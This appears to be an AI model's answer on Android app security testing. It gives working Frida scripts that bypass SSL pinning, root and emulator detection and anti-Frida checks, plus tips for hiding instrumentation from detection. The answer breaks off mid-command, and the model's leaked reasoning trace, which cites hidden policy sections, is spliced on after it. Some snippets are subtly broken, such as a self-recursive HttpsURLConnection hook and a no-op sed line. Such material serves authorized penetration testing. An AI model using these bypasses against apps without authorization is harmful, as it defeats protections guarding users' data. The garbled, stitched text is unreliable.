# deepseek-v4.1-flash-1017 — mobile-sec

# Android App Security Testing Pipeline

End-to-end: static → device prep → Frida → pinning bypass → anti-tamper bypass → component/deeplink/WebView testing → API surface.

---

## 0. Tooling baseline

```bash
# core
sudo apt install -y jadx apktool aapt adb zipalign apksigner mitmproxy
pipx install frida-tools objection drozer 2>/dev/null || true
pip install androguard
# Frida adapter for device arch
pip install frida
```

```bash
adb devices
adb shell getprop ro.product.cpu.abi
adb shell getprop ro.build.version.release
```

---

## 1. Static analysis

### 1.1 Decode

```bash
apktool d -f -s app.apk -o out          # -s: no smali baksmaling (fast manifest/res pass)
apktool d -f app.apk -o out_full        # full smali
jadx -d jadx_out --deobf --show-bad-code app.apk
```

### 1.2 Manifest — exported components, permissions, config

```bash
# decoded manifest is plain XML
grep -nE 'android:exported="true"' out/AndroidManifest.xml
# components with intent-filter but no explicit exported (defaults vary by SDK)
grep -nE '<(activity|activity-alias|service|receiver|provider)' -A6 out/AndroidManifest.xml | grep -B1 -A5 intent-filter
grep -nE 'uses-permission|usesCleartextTraffic|networkSecurityConfig|debuggable|allowBackup|taskAffinity' out/AndroidManifest.xml
aapt dump badging app.apk | grep -iE 'package|launchable|sdkVersion'
```

Automated parse:

```python
# manifest_exported.py  (python3 manifest_exported.py out/AndroidManifest.xml)
import sys, xml.etree.ElementTree as ET
NS='{http://schemas.android.com/apk/res/android}'
root=ET.parse(sys.argv[1]).getroot()
for tag in ('activity','activity-alias','service','receiver','provider'):
    for n in root.iter(tag):
        name=n.get(NS+'name'); exp=n.get(NS+'exported')
        has_if=any(c.tag=='intent-filter' for c in n)
        if exp=='true' or (exp is None and has_if):
            print(f"{tag:12} {name:60} exported={exp} intent_filter={has_if}")
            for a in n.iter('action'): print(f"    action: {a.get(NS+'name')}")
            for d in n.iter('data'):
                print(f"    data: scheme={d.get(NS+'scheme')} host={d.get(NS+'host')} path={d.get(NS+'path')} mime={d.get(NS+'mimeType')}")
```

### 1.3 Secret / endpoint grep

```bash
ROOT=jadx_out
gre() { grep -rEn --include='*.java' --include='*.kt' --include='*.xml' --include='*.json' "$1" "$ROOT"; }

gre 'AKIA[0-9A-Z]{16}'
gre 'AIza[0-9A-Za-z_\-]{35}'                       # Google API key
gre 'ya29\.[0-9A-Za-z_\-]+'                        # OAuth bearer
gre 'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}'  # JWT
gre '[0-9]{10,13}-[0-9a-z]{6,}\.apps\.googleusercontent\.com'
gre 'firebaseio\.com|firebaseapp\.com|storage\.googleapis\.com'
gre '(?i)(api[_-]?key|secret|token|passwd|password|pwd|client[_-]?secret)\s*[:=]\s*["'\''][^"'\'']{6,}'
gre '-----BEGIN [A-Z ]*PRIVATE KEY-----'
gre '(?i)(https?|wss?)://[a-zA-Z0-9._~:/?#\[\]@!\$&()*+,;=%-]+'
```

```bash
# dex string sweep (catches obfuscated/annotated strings)
for d in out_full/build/apk/classes*.dex; do strings -n 6 "$d"; done | sort -u > dex_strings.txt
grep -Ei 'https?://|token|secret|bearer' dex_strings.txt | sort -u
# optional trufflehog/gitleaks pass
trufflehog filesystem jadx_out --only-verified
```

### 1.4 High-signal patterns

```bash
gre 'setJavaScriptEnabled|addJavascriptInterface|setAllowFileAccess|setAllowUniversalAccessFromFileURLs|shouldOverrideUrlLoading|onReceivedSslError'
gre 'getIntent\(\)\.get(String|Parcelable|Serializable)Extra|getData\(\)|getExtras\(\)'
gre 'MODE_WORLD_READABLE|MODE_WORLD_WRITABLE|openFileOutput'
gre 'getExternalStorage|Environment\.getExternalStorage'
gre 'Log\.(d|v|i|w|e)\('
gre 'Cipher\.getInstance|SecretKeySpec|IvParameterSpec'
gre 'TrustManager|HostnameVerifier|CertificatePinner|checkServerTrusted'
gre 'isDebuggerConnected|/proc/self/maps|su -c|Runtime\.exec'
```

---

## 2. Frida

### 2.1 Rooted — frida-server

```bash
VER=$(frida --version)
ARCH=$(adb shell getprop ro.product.cpu.abi | tr -d '\r')
# e.g. frida-server-16.x.x-android-arm64.xz from github.com/frida/frida/releases
xz -d frida-server-$VER-android-$ARCH.xz
adb push frida-server-$VER-android-$ARCH /data/local/tmp/frida-server
adb shell "su -c 'chmod 755 /data/local/tmp/frida-server'"
adb shell "su -c '/data/local/tmp/frida-server -l 0.0.0.0:27042 >/dev/null 2>&1 &'"
adb forward tcp:27042 tcp:27042
frida-ps -H 127.0.0.1:27042 | grep -i <pkg>
```

Renamed / non-default port to evade string detection:

```bash
adb shell "su -c 'cp /data/local/tmp/frida-server /data/local/tmp/fs-$(openssl rand -hex 4); /data/local/tmp/fs-* -l 0.0.0.0:47654 &'"
```

### 2.2 Non-rooted — gadget injection

Automatic:

```bash
objection patchapk -s app.apk
adb install -r app.objection.apk
# objection's gadget defaults to listen :27042; connect with:
adb forward tcp:27042 tcp:27042
frida -H 127.0.0.1:27042 -n Gadget -l hook.js
```

Manual (gives control over config + code injection point):

```bash
GADGET=frida-gadget-$VER-android-arm64.so
mkdir -p out_full/lib/arm64-v8a out_full/lib/armeabi-v7a
cp $GADGET out_full/lib/arm64-v8a/libfrida-gadget.so
# config must sit next to the .so with matching basename
cat > out_full/lib/arm64-v8a/libfrida-gadget.config <<'EOF'
{
  "interaction": { "type": "listen", "address": "0.0.0.0", "port": 27042, "on_load": "wait" },
  "runtime": "v8",
  "log": { "level": "info", "path": "/data/local/tmp/gadget.log" }
}
EOF
```

Inject `System.loadLibrary("frida-gadget")` into the `Application` subclass `<clinit>` (loads before app-level integrity checks):

```bash
APP=$(grep -oP 'android:name="\K[^"]+(?="[^>]*android:label|[^>]*>)' out_full/AndroidManifest.xml | head -1)
grep -rl "$(echo ${APP//.//})" out_full/smali*/ | head
# edit that .smali: append at start of .method static constructor <clinit>()V
```

Smali snippet:

```smali
.method static constructor <clinit>()V
    .locals 1
    const-string v0, "frida-gadget"
    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
    # ... original body
```

If the app has no custom `Application`, add one to the manifest and create the class with this `<clinit>`.

Rebuild + sign:

```bash
apktool b out_full -o patched.apk
zipalign -p -f 4 patched.apk patched-aligned.apk
keytool -genkeypair -keystore test.jks -alias t -keyalg RSA -keysize 2048 -validity 3650 -storepass testtest -keypass testtest -dname "CN=test"
apksigner sign --ks test.jks --ks-pass pass:testtest --out app.signed.apk patched-aligned.apk
adb uninstall <pkg>   # signature change requires uninstall
adb install app.signed.apk
```

### 2.3 Hook runner

```bash
# spawn gated
frida -U -f <pkg> -l ssl_bypass.js -l root_bypass.js -l webview_hook.js --runtime=v8
# if the process stays suspended:  %resume
# attach
frida -U -n <pkg> -l hook.js
# one-shot trace of a class
frida-trace -U -f <pkg> -j '*!*/okhttp3/*' -j '*!*CertificatePinner*'
```

---

## 3. SSL pinning bypass

### 3.1 `ssl_bypass.js` — universal

```javascript
'use strict';
function L(m){ console.log('[ssl] ' + m); }

Java.perform(function () {

  // ---------- 1. X509TrustManager / SSLContext ----------
  try {
    var X509TM = Java.use('javax.net.ssl.X509TrustManager');
    var TMFactory = Java.registerClass({
      name: 'com.frida.PermissiveTM',
      implements: [X509TM],
      methods: {
        checkClientTrusted: function (chain, authType) { L('checkClientTrusted'); },
        checkServerTrusted: function (chain, authType) { L('checkServerTrusted'); },
        getAcceptedIssuers: function () { return Java.array('java.security.cert.X509Certificate', []); }
      }
    });
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    var TMArr = Java.array('javax.net.ssl.TrustManager', [TMFactory.$new()]);
    SSLContext.init.overloads.forEach(function (o) {
      o.implementation = function () {
        L('SSLContext.init -> permissive TMs');
        return o.call(this, arguments[0], TMArr, arguments[2]);
      };
    });
  } catch (e) { L('SSLContext hook failed: ' + e); }

  // ---------- 2. Conscrypt TrustManagerImpl ----------
  try {
    var TMI = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TMI.checkTrustedRecursive.overloads.forEach(function (o) {
      o.implementation = function () {
        L('TrustManagerImpl.checkTrustedRecursive');
        return Java.use('java.util.ArrayList').$new();
      };
    });
  } catch (e) { L('TrustManagerImpl hook failed: ' + e); }

  // ---------- 3. OkHttp3 CertificatePinner ----------
  try {
    var CP = Java.use('okhttp3.CertificatePinner');
    CP.check.overloads.forEach(function (o) {
      o.implementation = function (host, certs) {
        L('OkHttp3 CertificatePinner.check(' + host + ')');
        return;
      };
    });
  } catch (e) { L('CertificatePinner hook failed: ' + e); }
  // OkHttp2 / legacy
  try {
    var CP2 = Java.use('com.squareup.okhttp.CertificatePinner');
    CP2.check.overloads.forEach(function (o) {
      o.implementation = function (h) { L('okhttp2 CertificatePinner.check(' + h + ')'); return; };
    });
  } catch (e) {}

  // ---------- 4. HostnameVerifier ----------
  try {
    var OKHV = Java.use('okhttp3.internal.tls.OkHostnameVerifier');
    OKHV.verify.overloads.forEach(function (o) {
      o.implementation = function () { L('OkHostnameVerifier.verify -> true'); return true; };
    });
  } catch (e) {}
  try {
    var HNV = Java.use('javax.net.ssl.HostnameVerifier');
    // dynamic proxies of the interface are covered by OkHostnameVerifier + URLConnection paths
  } catch (e) {}

  // ---------- 5. Apache HttpClient / HttpsURLConnection ----------
  try {
    var HUC = Java.use('javax.net.ssl.HttpsURLConnection');
    HUC.setDefaultHostnameVerifier.implementation = function (v) {
      L('HttpsURLConnection.setDefaultHostnameVerifier');
      return this.setDefaultHostnameVerifier(Java.use('javax.net.ssl.HostnameVerifier').$new ? v : v);
    };
  } catch (e) {}

  // ---------- 6. WebView SSL errors ----------
  try {
    var WVC = Java.use('android.webkit.WebViewClient');
    WVC.onReceivedSslError.overloads.forEach(function (o) {
      o.implementation = function (view, handler, error) {
        L('WebViewClient.onReceivedSslError -> proceed');
        handler.proceed();
      };
    });
  } catch (e) {}

  // ---------- 7. Network Security Config user-CA trust ----------
  try {
    var RTM = Java.use('android.security.net.config.RootTrustManager');
    RTM.checkServerTrusted.overloads.forEach(function (o) {
      o.implementation = function () { L('RootTrustManager.checkServerTrusted'); return; };
    });
  } catch (e) {}

  L('installed');
});
```

Run:

```bash
frida -U -f <pkg> -l ssl_bypass.js --runtime=v8
# objection equivalent
objection -g <pkg> explore -s "android sslpinning disable"
```

### 3.2 MITM proxy + trusted CA

```bash
# user-CA install (Android >=7 apps ignore it unless NSC opts in -> use gadget/NSC patch or root system store)
mitmproxy --mode regular --listen-port 8080
adb shell settings put global http_proxy 10.0.2.2:8080

# system-store install (root)
openssl x509 -inform PEM -subject_hash_old -in ~/.mitmproxy/mitmproxy-ca-cert.pem | head -1
HASH=$(openssl x509 -inform PEM -subject_hash_old -in ~/.mitmproxy/mitmproxy-ca-cert.pem | head -1)
cp ~/.mitmproxy/mitmproxy-ca-cert.pem $HASH.0
adb root; adb remount
adb push $HASH.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/$HASH.0
adb shell "settings put global http_proxy :0; settings delete global http_proxy"  # use device VPN/flags instead
```

Magisk (persistent, works on A14 APEX layout): module dir `system/etc/security/cacerts/$HASH.0`, reboot, then plain `adb shell settings put global http_proxy ...` not required if using transparent proxy / `mitmproxy --mode transparent` on a hotspot.

NSC-patching alternate path for non-rooted:

```bash
apk-mitm app.apk            # rewrites network_security_config to trust user CAs + re-signs
adb install -r app-patched.apk
# then install mitmproxy CA cert as a user cert:
# Settings > Security > Encryption & credentials > Install a certificate > CA certificate
```

Bypass for Flutter (BoringSSL in native): `reFlutter app.apk` or patch `libflutter.so` with the `ssl_verify_peer_cert` return patch; Frida Java hooks do not apply.

---

## 4. Root / emulator / Frida detection bypass

`root_bypass.js`:

```javascript
'use strict';
function L(m){ console.log('[root] ' + m); }

Java.perform(function () {

  // ---- Build props ----
  var Build = Java.use('android.os.Build');
  ['FINGERPRINT','MODEL','MANUFACTURER','PRODUCT','HARDWARE','BRAND','DEVICE','TAGS','TYPE','HOST','USER','ID'].forEach(function (f) {
    try {
      var field = Build[f].value;
      Build[f].value = f === 'TAGS' ? 'release-keys' : (f === 'FINGERPRINT' ? 'google/sdk_gphone64/emu64:8.0.0/OPR1.170623.032/4400000:user/release-keys' : 'google');
    } catch (e) {}
  });

  // ---- File.exists() / canRead() ----
  var suPaths = ['/system/bin/su','/system/xbin/su','/sbin/su','/system/app/Superuser.apk','/system/app/SuperSU.apk',
    '/data/local/su','/data/local/tmp/su','/data/local/tmp/frida-server','/data/local/tmp/re.frida.server',
    '/system/xbin/daemonsu','/system/etc/init.d/99SuperSUDaemon','/system/bin/.ext/.su','/system/xbin/which',
    '/system/app/BusyBox.apk','/system/bin/busybox','/su/bin/su'];
  var File = Java.use('java.io.File');
  File.exists.implementation = function () {
    var p = this.getAbsolutePath();
    if (suPaths.indexOf(p) !== -1) { L('File.exists blocked: ' + p); return false; }
    return this.exists();
  };
  File.canRead.implementation = function () {
    var p = this.getAbsolutePath();
    if (suPaths.indexOf(p) !== -1) return false;
    return this.canRead();
  };

  // ---- Runtime.exec ----
  var Runtime = Java.use('java.lang.Runtime');
  Runtime.exec.overload('java.lang.String').implementation = function (cmd) {
    if (/su|which|busybox|frida|magisk/i.test(cmd)) { L('Runtime.exec blocked: ' + cmd); throw Java.use('java.io.IOException').$new('no'); }
    return this.exec(cmd);
  };
  Runtime.exec.overload('[Ljava.lang.String;').implementation = function (a) {
    var j = Java.use('java.util.Arrays').toString(a);
    if (/su|which|busybox|frida|magisk/i.test(j)) { L('Runtime.exec blocked: ' + j); throw Java.use('java.io.IOException').$new('no'); }
    return this.exec(a);
  };

  // ---- PackageManager root/Xposed package probes ----
  var banned = ['com.noshufou.android.su','com.noshufou.android.su.elite','eu.chainfire.supersu',
    'com.koushikdutta.superuser','com.thirdparty.superuser','com.yellowes.su','com.topjohnwu.magisk',
    'com.kingroot.kinguser','com.kingo.root','com.smedialink.oneclickroot','com.zhiqupk.root.global',
    'com.alephzain.framaroot','de.robv.android.xposed.installer','com.saurik.substrate','com.zachspong.temprootremovejb',
    'com.amphoras.hidemyroot','com.formyhm.hideroot','com.ramdroid.appquarantine','com.devadvance.rootcloak'];
  var PM = Java.use('android.app.ApplicationPackageManager');
  try {
    PM.getPackageInfo.overload('java.lang.String','int').implementation = function (name, flags) {
      if (banned.indexOf(name) !== -1) throw Java.use('android.content.pm.PackageManager$NameNotFoundException').$new(name);
      return this.getPackageInfo(name, flags);
    };
    PM.getPackageInfo.overload('java.lang.String','android.content.pm.PackageManager$PackageInfoFlags').implementation = function (n,f){
      if (banned.indexOf(n) !== -1) throw Java.use('android.content.pm.PackageManager$NameNotFoundException').$new(n);
      return this.getPackageInfo(n,f);
    };
    PM.getInstalledPackages.overload('int').implementation = function (flags) {
      var r = this.getInstalledPackages(flags);
      var it = r.iterator();
      var kill = [];
      while (it.hasNext()) { var p = it.next(); if (banned.indexOf(p.packageName.value) !== -1) kill.push(p); }
      kill.forEach(function (p) { r.remove(p); });
      return r;
    };
  } catch (e) { L('PM hook: ' + e); }

  // ---- System properties ----
  var SP = Java.use('android.os.SystemProperties');
  var origGet = SP.get.overload('java.lang.String');
  origGet.implementation = function (k) {
    if (k === 'ro.debuggable') return '0';
    if (k === 'ro.secure') return '1';
    if (k === 'ro.build.tags') return 'release-keys';
    if (/frida|xposed|magisk/i.test(k)) return '';
    return origGet.call(this, k);
  };

  // ---- Debugger ----
  try {
    Java.use('android.os.Debug').isDebuggerConnected.implementation = function () { return false; };
  } catch (e) {}

  // ---- Frida port scan / proc maps ----
  var Socket = Java.use('java.net.Socket');
  Socket.connect.overload('java.net.SocketAddress').implementation = function (a) {
    var s = a.toString();
    if (s.indexOf(':27042') !== -1 || s.indexOf(':27043') !== -1) throw Java.use('java.net.ConnectException').$new();
    return this.connect(a);
  };

  // ---- TracerPid (also blocks ptrace-based anti-debug) ----
  try {
    var BufferedReader = Java.use('java.io.BufferedReader');
    BufferedReader.readLine.implementation = function () {
      var line = this.readLine();
      if (line && line.indexOf('TracerPid:') === 0) return 'TracerPid:\t0';
      return line;
    };
  } catch (e) {}

  L('installed');
});
```

Native-side detection (maps scanning for `frida`/`gum`/`linjector`, thread names `gmain`/`gum-js-loop`/`pool-spawner`, `frida_server` in `/proc/self/task/*/comm`) has to be handled with a renamed agent and, ideally, gadget injection rather than frida-server. Practical mitigations:

```bash
# rename agent + non-default port + randomize
cp frida-server /data/local/tmp/fs && sed -i 's/frida-server/zz/' /dev/null  # (rename only; binary strings still present)
# Magisk: use a Zygisk-based launcher / hide the binary under a random path, e.g. /data/adb/fsrv
# Prefer gadget injection for apps with strong native anti-Frida.
```

---

## 5. Exported component testing (drozer + adb)

### Drozer

```bash
adb install drozer-agent.apk
adb forward tcp:31415 tcp:31415
drozer console connect
```

```text
run app.package.attacksurface <pkg>
run app.activity.info -a <pkg>
run app.service.info -a <pkg>
run app.broadcast.info -a <pkg>
run app.provider.info -a <pkg>
run app.provider.finduri <pkg>
run scanner.provider.injection -a <pkg>
run scanner.provider.traversal -a <pkg>
run scanner.provider.sqltables -a <pkg>
run app.package.manifest <pkg>
```

Launch exported activities/services/receivers directly:

```text
run app.activity.start --

---

## [reasoning trace]

The user wants a complete Android app security testing pipeline with concrete commands, scripts, and payloads. This is standard authorized mobile pentesting work — static analysis, Frida, SSL pinning bypass, root detection bypass, drozer, deep links, WebView, API surface extraction. None of this matches the Section 5 prohibitions — it's dual-use security tooling against an app the operator has written scope for. So: deliver full technical depth, commands, scripts.

Let me build a comprehensive, well-organized pipeline. Prioritize commands over prose.

Structure:
1. Environment setup / device prep
2. Static analysis: apktool, jadx, grep patterns, manifest parsing (exported components), secret scanning
3. Frida: gadget injection for non-rooted, frida-server for rooted
4. SSL pinning bypass (universal script + common pinning frameworks: OkHttp CertificatePinner, TrustManager, Conscrypt, network_security_config, Flutter, React Native, WebView)
5. Root/emulator/Frida detection bypass
6. Drozer: exported component testing
7. Deep links / intent redirection / WebView addJavascriptInterface abuse
8. Mobile API surface extraction: mitmproxy, endpoints from decompiled source, GraphQL, etc.

Concrete commands, real scripts. Let me write it.

Key details to get right:

- apktool: `apktool d app.apk -o out` 
- jadx: `jadx -d out --show-bad-code app.apk`, or jadx-gui
- grep for secrets in smali: aws keys, google api keys, firebase, jwt, private keys
- manifest: aapt2 dump xmltree, or apktool manifest, or `am`/`dumpsys`. Use `aapt dump xmltree app.apk AndroidManifest.xml` or python androguard.

Exported components: parse manifest for android:exported="true" or with intent-filter (pre-Android 12 default true when intent-filter present).

- drozer: `dz> run app.package.attacksurface com.pkg`, `run app.activity.info -a`, `run app.service.info`, `run app.broadcast.info`, `run app.provider.info`, `run scanner.provider.injection`, `run scanner.provider.traversal`
- adb am start with extra, `am start -n pkg/.Activity --es key value`, `am start -a android.intent.action.VIEW -d "scheme://..."`, `am broadcast -a ...`, `content query --uri content://...`
- WebView: find setJavaScriptEnabled, addJavascriptInterface, loadUrl with getIntent data, setAllowFileAccess, WebViewClient onReceivedSslError, shouldOverrideUrlLoading.

- Frida gadget injection non-rooted: 
  - Patch APK: add `libfrida-gadget.so` to lib/<abi>/, add `System.loadLibrary("frida-gadget")` in smali of Application class or an added static initializer, add `frida-gadget.config` in lib dir with `{"interaction":{"type":"listen","address":"0.0.0.0","port":27042}}` or script mode.
  - Use `objection patchapk -s app.apk` which automates it. And `apk-mitm` for network security config.
  - sign with apksigner.

- frida-server rooted: push, chmod, run as root; or frida-server with `--listen`.
- `frida-ps -U`, `frida -U -f com.pkg -l hook.js --no-pause`
- `objection -g com.pkg explore`, `android sslpinning disable`, `android root disable`

- Universal SSL pinning bypass script — I'll write a solid one covering TrustManager, OkHttp CertificatePinner, HostnameVerifier, X509TrustManager, Conscrypt, TrustManagerImpl.checkTrustedRecursive, SSLContext.init, network security config.

- Scripts for root/emulator detection bypass: hook Build.TAGS, File.exists for su paths, Runtime.exec, PackageManager.getPackageInfo for known root packages, SystemProperties, `ro.debuggable`, `ro.secure`, Frida detection (open /proc/self/maps for frida, port 27042, thread names gmain/gum-js-loop, `frida` string scan).

Let me write the Frida scripts well and complete.

Frida SSL pinning universal (covers OkHttp3, TrustManagerImpl, SSLContext):

```js
Java.perform(function () {
  var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
  var TrustManagerImpl = null;
  try { TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl'); } catch (e) {}
  ...
});
```

I'll write a comprehensive one.

Also mention: `frida-trace`, spawn gating with `--no-pause` deprecated in newer frida; use `-f pkg --runtime=v8`.

Note: recent Frida versions removed `--no-pause`? Actually `frida -f pkg -l script.js` now resumes by default; `%resume`. I'll note both.

Let me also include API surface extraction: mitmproxy with cert install (system store as root, or Magisk module, or use apk-mitm to repackage with user CA trust), extract endpoints via `grep -rEho 'https?://[a-zA-Z0-9./_?&=-]+'`, strings on dex, jadx deobf, then fuzz with ffuf/curl.

Mention `objection` and `mobsf` as options? MobSF for static/dynamic automated. Keep commands.

Now let me write it all out. Format with headers, code blocks. Be thorough but command-dense.

I'll write the full answer now.

Some specifics:

Static secret grep patterns:
```bash
grep -rEn "AKIA[0-9A-Z]{16}" .
grep -rEn "AIza[0-9A-Za-z\-_]{35}" .
grep -rEn "eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}" .   # JWT
grep -rEn "(?i)(api[_-]?key|secret|token|password|passwd|pwd)\s*[:=]" .
grep -rEn "-----BEGIN (RSA|EC|DSA|OPENSSH|PRIVATE) PRIVATE KEY-----" .
grep -rEn "https?://[^\"' ]+" .
grep -rEn "firebaseio\.com|firebase" .
```
Also `trufflehog filesystem` and `gitleaks detect`.

Dex strings: `strings -n 6 classes*.dex`.

Manifest parse with androguard python:
```python
from androguard.core.apk import APK
a = APK("app.apk")
```
Actually androguard v4 API: `from androguard.core.apk import APK`. Let me use aapt2 for reliability, plus a python snippet with androguard.

Simpler: use `aapt2 dump xmltree --file AndroidManifest.xml app.apk` and grep exported. Or apktool output `out/AndroidManifest.xml` is plain text XML — grep in it. Good.

Exported components grep:
```bash
grep -nE 'android:exported="true"|intent-filter' out/AndroidManifest.xml
```
Better: use `mobsf` or a small python. I'll give a python snippet parsing apktool-decoded manifest with lxml.

Drozer module install: `drozer console connect`, `run app.package.list`, `run app.package.attacksurface com.pkg`.

Drozer alternative: `adb shell am ...`.

WebView attack: find in jadx search for `addJavascriptInterface`, `setJavaScriptEnabled`, `loadUrl`. If a WebView loads attacker-controlled URL (from deep link) and has JS interface annotated @JavascriptInterface, you get RCE on old SDKs / data theft.

Deep link: `adb shell am start -W -a android.intent.action.VIEW -d "myapp://path?param=..." com.pkg`. Also `am start -n com.pkg/.MainActivity -d ...`.

Intent redirection: exported activity that calls `getIntent().getParcelableExtra("extra")` then `startActivity` — nested intent.

Provider: `content query --uri content://com.pkg.provider/` and drozer `run scanner.provider.traversal`.

Frida gadget non-rooted:
```bash
mkdir -p out/lib/arm64-v8a
cp frida-gadget-<ver>-android-arm64.so out/lib/arm64-v8a/libfrida-gadget.so
```
Add config next to it:
```json
{ "interaction": { "type": "listen", "address": "0.0.0.0", "port": 27042, "parameters": { "runtime": "v8" } } }
```
Wait, config file should be named `libfrida-gadget.config` (matching library name prefix) so gadget auto-loads? Actually gadget looks for `<libname>.config` i.e. `libfrida-gadget.config` if the lib is `libfrida-gadget.so`. Place in same dir.

Inject load: in smali of an Application class `<clinit>` or `onCreate`, add `invoke-static {}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V` with const-string "frida-gadget". Or simplest: `objection patchapk -s app.apk`.

Repack + sign:
```bash
apktool b out -o patched.apk
zipalign -p -f 4 patched.apk patched-aligned.apk
apksigner sign --ks key.jks --ks-pass pass:... --out signed.apk patched-aligned.apk
```
Note: for gadget you may need to keep original signature? No, just sign with own key and uninstall original (which wipes data — fine for testing; use `adb install -r` only if same key, so uninstall first).

Actually to avoid breaking signature, on non-rooted you must re-sign; app will detect signature change (some apps do). Note that.

Rooted path:
```bash
adb push frida-server /data/local/tmp/
adb shell "su -c 'chmod 755 /data/local/tmp/frida-server'"
adb shell "su -c '/data/local/tmp/frida-server -l 0.0.0.0 &'"
frida-ps -U
```

For emulator/root detection bypass, hook common checks.

Let me write the root/emulator detection bypass script covering:
- Build: FINGERPRINT, MODEL, MANUFACTURER, HARDWARE, TAGS (contains "test-keys"), PRODUCT
- File.exists() for /system/app/Superuser.apk, /system/xbin/su, /sbin/su, /system/bin/su, /data/local/tmp/frida-server, /system/xbin/daemonsu, etc.
- Runtime.exec for `su`, `which su`
- PackageManager for com.noshufou.android.su, com.koushikdutta.superuser, eu.chainfire.supersu, com.topjohnwu.magisk, de.robv.android.xposed.installer
- System.getProperty, android.os.SystemProperties.get("ro.debuggable"/"ro.secure")
- Debug.isDebuggerConnected / isDebug
- Frida detection: scanning /proc/self/maps for "frida", checking ports 27042/27043, checking thread names (gum-js-loop, gmain, pool-spawner), checking for TracerPid in /proc/self/status (also anti-debug)

I'll write a robust JS.

Also mention using Magisk Zygisk + `frida-server` renamed, and `magiskhide`/`shamiko`, and using gadget instead to avoid frida-server detection.

Now the SSL pinning bypass script. Comprehensive:

```js
// frida -U -f com.pkg -l ssl_bypass.js
'use strict';
function log(m){ console.log('[ssl] ' + m); }
Java.perform(function () {
  // 1. TrustManager / SSLContext
  var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
  var TrustManager = Java.registerClass({
    name: 'com.frida.TrustManager',
    implements: [X509TrustManager],
    methods: {
      checkClientTrusted: function (chain, authType) {},
      checkServerTrusted: function (chain, authType) {},
      getAcceptedIssuers: function () { return []; }
    }
  });
  var SSLContext = Java.use('javax.net.ssl.SSLContext');
  var TrustManagerArr = Java.use('[javax.net.ssl.TrustManager]');
  var init = SSLContext.init.overload('[javax.net.ssl.KeyManager]', '[javax.net.ssl.TrustManager]', 'java.security.SecureRandom');
  init.implementation = function (km, tm, sr) {
    log('SSLContext.init');
    init.call(this, km, TrustManagerArr.$new(1).$new ? ... , sr);   // tricky
  };
```
Better approach for replacing TrustManagers: build array via `Java.array('javax.net.ssl.TrustManager', [TrustManager.$new()])`.

```js
  init.implementation = function (km, tm, sr) {
    log('SSLContext.init -> injecting permissive TrustManager');
    var permissive = Java.array('javax.net.ssl.TrustManager', [TrustManager.$new()]);
    return init.call(this, km, permissive, sr);
  };
```

2. TrustManagerImpl (Conscrypt) checkTrustedRecursive / checkTrusted
```js
  try {
    var TMI = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TMI.checkTrustedRecursive.implementation = function (certs, host, clientAuth, untrustedChain, trustAnchorChain, used) {
      log('TrustManagerImpl.checkTrustedRecursive bypass');
      return Java.use('java.util.ArrayList').$new();
    };
  } catch (e) {}
```
Also `checkTrusted`. Function signature varies; hooking may fail — wrap in try.

3. OkHttp3 CertificatePinner.check
```js
  try {
    var CP = Java.use('okhttp3.CertificatePinner');
    CP.check.overload('java.lang.String', 'java.util.List').implementation = function (h, p) { log('OkHttp3 CertificatePinner.check ' + h); };
    // older: check(String, Certificate[]) 
    try {
      CP.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function (h, p) { log('okhttp3 check cert[]'); };
    } catch (e) {}
  } catch (e) {}
```

4. HostnameVerifier
```js
  try {
    var HV = Java.use('javax.net.ssl.HostnameVerifier');
    var OkHV = Java.use('okhttp3.internal.tls.OkHostnameVerifier');
    OkHV.verify.overload('java.lang.String', 'javax.net.ssl.SSLSession').implementation = function (h, s) { return true; };
  } catch(e){}
  // generic:
  try {
    var HNV = Java.use('javax.net.ssl.HostnameVerifier');
    // can't hook interface easily
  } catch(e){}
```

5. WebView ssl error
```js
  try {
    var WVC = Java.use('android.webkit.WebViewClient');
    WVC.onReceivedSslError.overload('android.webkit.WebView', 'android.webkit.SslErrorHandler', 'android.net.http.SslError').implementation = function (v, h, e) { h.proceed(); };
    WVC.onReceivedHttpAuthRequest.implementation = function () { /* proceed */ };
  } catch(e){}
```

6. Apache / HttpsURLConnection via TrustManager default.

7. Network Security Config: can't bypass at runtime unless the app trusts user CAs — but the TrustManager hook handles it because the config results in a TrustManager; hooking checkServerTrusted / TrustManagerImpl covers most. Also hook `android.security.net.config.TrustedCertificateStore` and `NetworkSecurityConfig` builder if needed. I'll add a hook of `com.android.org.conscrypt.Platform` maybe not.

Add hook for `android.security.net.config.RootTrustManager.checkServerTrusted`.

Also for Flutter (BoringSSL native) — mention `reFlutter` / patch libflutter; and for React Native (JS, uses OkHttp → covered).

Also mention `frida-trace` and `objection android sslpinning disable`.

Let me finalize the scripts and commands. Keep it tight but complete.

I'll also add mitmproxy setup with system cert install (root) or `apk-mitm` for non-root or objection patchapk with --network-security-config... Actually objection patchapk injects a network_security_config that trusts user CAs by default in recent versions (`objection patchapk --network-security-config`? there's `--skip-resources`). apk-mitm handles it: `apk-mitm app.apk` produces patched.

Cert install to system store (root):
```bash
# convert PEM to old hash-named format
openssl x509 -inform PEM -subject_hash_old -in mitmproxy-ca-cert.pem | head -1
# gives hash, e.g. c8750f0d
cp mitmproxy-ca-cert.pem c8750f0d.0
# push to /system/etc/security/cacerts on rooted device
adb root; adb remount
adb push c8750f0d.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/c8750f0d.0
```
Note: Android 14 system store is /system/etc/security/cacerts still but APEX; Magisk module approach: `/data/adb/modules/.../system/etc/security/cacerts/`. I'll mention Magisk module.

API surface extraction:
```bash
# jadx deobf
jadx -d jadx_out --deobf app.apk
grep -rhoE "https?://[a-zA-Z0-9._~:/?#\[\]@!$&'()*+,;=%-]+" jadx_out | sort -u > urls.txt
# retrofit annotations
grep -rn "@GET\|@POST\|@PUT\|@DELETE\|@PATCH\|@Headers" jadx_out | head
```
